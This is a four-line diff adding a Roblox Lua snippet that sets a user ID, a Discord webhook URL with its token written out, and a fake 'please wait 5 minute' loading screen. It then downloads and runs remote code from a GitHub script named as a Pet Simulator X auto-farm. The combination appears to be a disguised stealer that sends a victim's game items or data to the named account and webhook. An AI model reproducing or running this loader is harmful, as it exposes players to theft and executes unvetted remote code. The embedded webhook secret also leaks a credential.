@@ -1,0 +1,4 @@
+_G.UserID = 2957861429
+_G.WebHook = "https://discord.com/api/webhooks/1064790975135883264/gzukEtckTn7XFfaT9mDeJWIoaM8WNJoCblrMy4RZrE-dmWd8D9xvudKJtKMOkwF78Er6"
+_G.LoadingScreenText = "Loading Plase Wait 5 Minute"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))() 
